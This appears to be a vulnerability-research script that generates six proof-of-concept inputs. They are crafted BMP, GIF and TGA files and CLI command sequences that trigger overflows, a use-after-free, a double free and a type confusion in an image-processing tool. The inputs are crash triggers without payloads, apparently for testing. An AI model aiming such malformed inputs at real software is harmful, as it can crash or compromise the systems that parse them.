import struct
import os

def write_poc_file(filename, data):
    os.makedirs("pocs", exist_ok=True)
    path = os.path.join("pocs", filename)
    with open(path, "wb") as f:
        f.write(data)
    print(f"Generated: {path}")

# ==========================================
# Bug 1: BMP Integer Overflow (Heap Buffer Overflow)
# ==========================================
def make_poc_bug1():
    # width = 524289 (0x80001)
    # height = 2048 (0x800)
    # channels = 4 (for 32-bit BMP)
    # width * height * channels = 0x80001 * 0x800 * 4 = 0x100002000 => 0x2000 (8192 bytes)
    # Allocates 8192 bytes, but writes 524289 * 4 = 2097156 bytes per row!
    
    file_header = struct.pack("<2sIHHI", b"BM", 54 + 1000, 0, 0, 54)
    info_header = struct.pack("<IiiHHIIiiII", 
                              40,        # biSize
                              524289,    # biWidth
                              2048,      # biHeight
                              1,         # biPlanes
                              32,        # biBitCount
                              0,         # biCompression (uncompressed)
                              0,              # biSizeImage
                              2835, 2835, 0, 0)
    
    # Dummy pixel data (just a few bytes)
    pixel_data = b"\x00" * 1000
    
    return file_header + info_header + pixel_data

# ==========================================
# Bug 2: GIF LZW Out-of-Bounds Write
# ==========================================
def pack_lzw_codes(codes, min_code_size):
    bits = ""
    code_size = min_code_size + 1
    table_size = (1 << min_code_size) + 2
    for c in codes:
        # format code as binary string of code_size bits, reversed (LSB first)
        binary = format(c, f"0{code_size}b")[::-1]
        bits += binary
        # Simulating table size increase
        if c != (1 << min_code_size) and c != (1 << min_code_size) + 1:
            table_size += 1
            if table_size == (1 << code_size) + 1 and code_size < 12:
                code_size += 1
                
    # Pad bits to multiple of 8
    while len(bits) % 8 != 0:
        bits += "0"
        
    # Convert to bytes
    bytes_data = bytearray()
    for i in range(0, len(bits), 8):
        byte_str = bits[i:i+8][::-1] # reverse back to MSB first for int conversion
        bytes_data.append(int(byte_str, 2))
        
    # Wrap into sub-blocks
    result = bytearray()
    offset = 0
    while offset < len(bytes_data):
        chunk_size = min(255, len(bytes_data) - offset)
        result.append(chunk_size)
        result.extend(bytes_data[offset:offset+chunk_size])
        offset += chunk_size
    result.append(0) # block terminator
    return result

def make_poc_bug2():
    # Minimal GIF: 2x2 logical screen (4 pixels), but LZW decodes 26 pixels, leading to OOB write.
    header = b"GIF89a"
    logical_screen_desc = struct.pack("<HHBBB", 2, 2, 0x80, 0, 0) # GCT size 2
    gct = b"\x00\x00\x00\xff\xff\xff" # Black and White
    image_desc = struct.pack("<BHHHHB", 0x2C, 0, 0, 2, 2, 0) # separator, left, top, w, h, flags
    
    # LZW Stream
    min_code_size = 2
    # codes: Clear (4), 0, 0, 6 (pattern 0-0), 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, EOI (5)
    codes = [4, 0, 0, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 6, 5]
    lzw_data = pack_lzw_codes(codes, min_code_size)
    
    return header + logical_screen_desc + gct + image_desc + bytes([min_code_size]) + lzw_data + b"\x3B" # 3B is GIF trailer

# ==========================================
# Bug 3: CLI Use-After-Free (FilterCache)
# ==========================================
def make_poc_bug3():
    # Exceed cache capacity (3) to evict key 'img1'.
    # Eviction deletes 'img1' but leaves key in map.
    # Retrieval gets dangling pointer, and filter executes UAF.
    cmds = [
        "create 10 10 3",
        "cache put img1",
        "create 10 10 3",
        "cache put img2",
        "create 10 10 3",
        "cache put img3",
        "create 10 10 3",
        "cache put img4",
        "cache get img1",
        "grayscale",
    ]
    return "\n".join(cmds).encode()

# ==========================================
# Bug 4: CLI Double Free (FilterCache)
# ==========================================
def make_poc_bug4():
    # Exceed cache capacity (3) to evict key 'img1'.
    # Eviction deletes 'img1' but leaves key in map.
    # Calling cache clear deletes it again.
    cmds = [
        "create 10 10 3",
        "cache put img1",
        "create 10 10 3",
        "cache put img2",
        "create 10 10 3",
        "cache put img3",
        "create 10 10 3",
        "cache put img4",
        "cache clear",
    ]
    return "\n".join(cmds).encode()

# ==========================================
# Bug 5: TGA Heap Buffer Overread
# ==========================================
def make_poc_bug5():
    # TGA Header (18 bytes): RLE true-color (type 10), width=10, height=10, depth=24.
    header = struct.pack("<BBBHHBHHHHBB", 
                         0,        # id_length
                         0,        # color_map_type
                         10,       # image_type (RLE true-color)
                         0, 0, 0,  # color_map_spec
                         0,        # x_origin
                         0,        # y_origin
                         10,       # width
                         10,       # height
                         24,       # pixel_depth
                         0)        # image_descriptor
    
    # 1 byte packet header (0x00 => raw packet, count = 1, requires 3 bytes of pixels).
    # Since we provide no pixel bytes and end the file, copying reads past data buffer.
    packet_header = b"\x00"
    
    return header + packet_header

# ==========================================
# Bug 6: CLI Type Confusion (Metadata Block Casting)
# ==========================================
def make_poc_bug6():
    # Add a CommentsBlock (index 0).
    # Then view it casted as an EXIFBlock.
    cmds = [
        'metadata add comment "Google DeepMind" "Testing type confusion" 1624640000',
        'metadata view_exif 0'
    ]
    return "\n".join(cmds).encode()

if __name__ == "__main__":
    write_poc_file("poc_bug1.bin", make_poc_bug1())
    write_poc_file("poc_bug2.bin", make_poc_bug2())
    write_poc_file("poc_bug3.bin", make_poc_bug3())
    write_poc_file("poc_bug4.bin", make_poc_bug4())
    write_poc_file("poc_bug5.bin", make_poc_bug5())
    write_poc_file("poc_bug6.bin", make_poc_bug6())
